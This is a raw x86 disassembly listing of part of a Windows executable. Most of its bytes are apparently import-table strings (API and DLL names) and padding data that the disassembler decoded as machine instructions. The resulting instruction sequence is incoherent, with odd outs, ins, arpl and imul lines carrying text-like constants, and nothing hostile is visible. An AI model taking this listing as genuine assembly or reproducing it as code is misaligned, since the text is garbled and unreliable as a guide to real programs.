  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
